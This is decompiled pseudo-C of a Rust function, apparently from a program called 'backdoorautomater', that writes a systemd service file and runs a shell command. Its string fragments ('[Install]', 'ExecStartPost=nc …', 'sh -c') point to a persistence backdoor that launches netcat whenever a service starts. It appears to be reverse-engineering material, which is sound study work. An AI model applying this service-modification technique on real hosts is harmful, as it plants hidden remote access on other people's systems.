
  char const (**)[0x94] backdoorautomater::modifyservice::write_service::hc4c312686b13b0b4(int128_t* arg1, int128_t* arg2, void* arg3)

{
    char const* const var_f8 = arg2[1];
    int128_t var_108 = *arg2;
    int128_t var_f0 = *arg1;
    int64_t var_e0 = arg1[1];
    int128_t var_1a0;
    alloc::str::join_generic_copy::h6e3e6eb2fb0da332(&var_1a0, &var_108, 2, 1, 0);
    uint64_t var_190;
    uint64_t var_1a8 = var_190;
    int128_t var_1b8 = var_1a0;
    core::ptr::drop_in_place$LT$$u5b$alloc..string..String$u3b$$u20$2$u5d$$GT$::hfd07afc6d277b85d(
        &var_108);
    var_108 = &data_566081[0x45];
    *var_108[8] = 0xa;
    var_f8 = var_1b8;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a0, &var_108, 2, 1, 0);
    uint64_t var_158 = var_190;
    int128_t var_168 = var_1a0;
    std::fs::File::create::he97042899d0016f9(&var_108, &var_1b8);
    char const (** result)[0x94];
    
    if (!var_108)
    {
        int32_t fd = *var_108[4];
        int64_t rax_5;
        int64_t rdx;
        rax_5 = _$LT$$RF$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::he83e32c7780ec148(arg3);
        int64_t var_1d8 = rax_5;
        int64_t var_1d0_1 = rdx;
        void* rax_6 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_1d8);
        int128_t var_148;
        
        if (!rax_6)
        {
            label_455cb2:
            std::process::Command::new::hc59b10cf3f1b2ada(&var_108, 
                "sh-cFailed to execute commandsrc…");
            std::process::Command::arg::h1a6c514e95e1ad22(
                std::process::Command::arg::ha1bca970e684ecbe(&var_108, 
                    "-cFailed to execute commandsrc/m…"), 
                &var_168);
            std::process::Command::output::hf2f7777b705db8a9(&var_1a0);
            core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_148, &var_1a0);
            core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_108);
            int64_t var_128;
            size_t var_120;
            alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_1a0, var_128, var_120);
            int64_t rax_8;
            uint64_t rdx_6;
            rax_8 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_1a0);
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                &var_108, rax_8, rdx_6);
            char const* const var_1c8_1 = var_f8;
            var_1d8 = var_108;
            core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                &var_1a0);
            backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_1d8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1d8);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_148);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_168);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1b8);
            return nullptr;
        }
        
        while (true)
        {
            var_108 = *(rax_6 + 8);
            var_f8 = "\n[Install]okExecStartPost=nc Ex…";
            var_f0 = 1;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a0, &var_108, 2, 1, 0);
            uint64_t var_138_1 = var_190;
            var_148 = var_1a0;
            char const (** result_1)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_148[8], var_190);
            result = result_1;
            
            if (result_1)
            {
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                break;
            }
            
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
            rax_6 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_1d8);
            
            if (!rax_6)
                goto label_455cb2;
        }
    }
    else
        result = *var_108[8];
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_168);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1b8);
    return result;
}
